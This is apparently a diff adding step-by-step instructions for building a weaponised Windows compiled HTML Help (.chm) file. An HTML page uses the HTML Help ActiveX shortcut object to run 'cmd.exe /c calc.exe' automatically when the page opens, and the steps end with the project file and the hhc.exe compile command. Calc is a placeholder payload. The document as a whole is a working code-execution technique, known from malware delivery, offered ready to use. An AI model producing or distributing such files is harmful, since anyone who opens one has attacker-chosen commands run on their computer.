@@ -1,0 +1,32 @@
+Add the following code in "main.htm" file:
+
+<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
+  <PARAM name="Command" value="ShortCut">
+  <PARAM name="Button" value="Bitmap::shortcut">
+  <PARAM name="Item1" value=',cmd.exe,/c calc.exe'>
+  <PARAM name="Item2" value="273,1,1">
+</OBJECT>
+<SCRIPT>
+  x.Click();
+</SCRIPT>
+
+---------------------------------------------------------------------------------------------
+
+Create "Viewhlp.hpp" file with the following syntax:
+
+[OPTIONS]
+Contents file=C:\Users\analyticsearch\Downloads\Viewhlp\viewhlp.hhc
+[FILES]
+C:\Users\analyticsearch\Downloads\Viewhlp\main.htm
+C:\Users\analyticsearch\Downloads\Viewhlp\$WWAssociativeLinks\Property
+***Enter all the files in the folder with full path***
+***Enter all the files in the folder with full path***
+***Enter all the files in the folder with full path***
+
+---------------------------------------------------------------------------------------------
+
+Comile "Viewhlp.hpp" to get "Viewhlp.chm"
+
+"C:\Program Files (x86)\HTML Help Workshop\hhc.exe" Viewhlp.hpp
+
+---------------------------------------------------------------------------------------------
